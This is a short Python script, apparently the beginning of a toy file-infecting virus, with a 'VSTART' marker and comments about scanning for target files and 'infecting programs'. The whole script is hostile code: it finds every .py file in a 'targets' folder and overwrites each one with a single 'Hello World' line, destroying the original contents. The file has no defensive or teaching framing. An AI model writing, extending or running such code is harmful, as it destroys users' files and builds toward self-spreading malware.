######### VSTART

######### module imports

import sys
import re
import glob
import os


######### scanning for potential target files

targets = glob.glob(".\\targets\\*.py")

#########

######### infecting programs

for t in targets:
    target = open(t, "w")
    target.writelines("print(\"Hello World\")")
    target.close()
